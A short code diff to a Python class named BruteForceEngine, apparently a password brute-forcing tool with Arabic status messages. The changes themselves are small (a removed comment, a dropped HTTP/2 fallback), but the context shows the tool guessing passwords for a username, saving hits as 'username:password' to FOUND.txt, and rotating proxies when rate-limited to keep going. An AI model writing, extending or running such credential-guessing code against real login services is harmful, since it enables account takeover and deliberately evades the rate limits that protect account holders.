@@ -106,7 +106,6 @@ class BruteForceEngine:
         (self.user_dir / "success.txt").write_text(
             json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8"
         )
-        # plain copy also
         (self.user_dir / "FOUND.txt").write_text(
             f"{self.username}:{password}\n", encoding="utf-8"
         )
@@ -130,10 +129,7 @@ class BruteForceEngine:
             proxy = self.proxy_manager.get_proxy()
             if proxy:
                 kwargs["proxy"] = proxy
-        try:
-            return httpx.Client(http2=True, **kwargs)
-        except Exception:
-            return httpx.Client(**kwargs)
+        return httpx.Client(**kwargs)
 
     def _test_password(self, client: httpx.Client, password: str) -> Dict[str, str]:
         try:
@@ -240,7 +236,6 @@ class BruteForceEngine:
                 elif st == "2fa":
                     print(f"\n{Y}[!] 2FA مفعّل — الحساب محمي{N}")
                     self._save_tested(password)
-                    # لا نعتبرها نجاح كامل بدون OTP
                 elif st == "rate_limited":
                     print(f"\n{Y}[!] rate limit — انتظار{N}")
                     if self.proxy_manager is not None:
